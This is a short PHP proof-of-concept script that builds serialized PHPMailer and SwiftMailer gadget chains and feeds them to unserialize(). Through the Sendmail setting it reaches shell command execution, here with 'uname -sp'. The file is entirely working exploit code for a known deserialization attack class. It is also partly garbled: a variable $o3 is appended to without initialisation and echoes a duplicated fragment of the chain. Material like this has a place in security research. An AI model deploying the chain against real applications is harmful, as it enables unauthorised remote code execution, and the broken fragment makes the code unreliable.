<?php

include __DIR__.'/vendor/autoload.php';

$cmd = "/bin/sh -c \"uname -sp\"";

$o1  = 'O:29:"PHPMailer\\PHPMailer\\PHPMailer":1:{';
$o1 .= 's:7:"'.chr(0)."*".chr(0).'smtp";';
$o1 .= 'O:24:"PHPMailer\\PHPMailer\\SMTP":3:{s:12:"'.chr(0).'*'.chr(0).'smtp_conn";R:7;s:8:"do_debug";i:999;';
$o1 .= 's:11:"Debugoutput";a:2:{i:0;O:29:"PHPMailer\\PHPMailer\\PHPMailer":2:{';
$o1 .= 's:6:"Mailer";s:8:"sendmail";';
$o1 .= 's:8:"Sendmail";s:'.strlen($cmd).':"'.$cmd.'";}';
$o1 .= 'i:1;s:8:"postSend";}}}';


$o3 .= 's:11:"Debugoutput";a:2:{i:0;O:29:"PHPMailer\\PHPMailer\\PHPMailer":2:{';
$o3 .= 's:6:"Mailer";s:8:"sendmail";';
$o3 .= 's:8:"Sendmail";s:'.strlen($cmd).':"'.$cmd.'";}';
$o3 .= 'i:1;s:8:"postSend";}}}';
echo $o3;

$o2  = 'O:30:"Swift_Transport_EsmtpTransport":3:{';
$o2 .= 's:10:"'.chr(0).'*'.chr(0).'started";b:1;';
$o2 .= 's:18:"'.chr(0).'*'.chr(0).'eventDispatcher";O:34:"Swift_Events_SimpleEventDispatcher":0:{}';
$o2 .= 's:9:"'.chr(0).'*'.chr(0).'buffer";O:31:"Swift_ByteStream_FileByteStream":4:{';
$o2 .= 's:37:"'.chr(0).'Swift_ByteStream_FileByteStream'.chr(0).'path";s:13:"/tmp/tempfile";';
$o2 .= 's:37:"'.chr(0).'Swift_ByteStream_FileByteStream'.chr(0).'mode";s:1:"w";';
$o2 .= 's:39:"'.chr(0).'Swift_ByteStream_FileByteStream'.chr(0).'writer";N;';
$o2 .= 's:39:"'.chr(0).'Swift_ByteStream_FileByteStream'.chr(0).'reader";'.$o1;
$o2 .= '}}';

unserialize($o2);

?>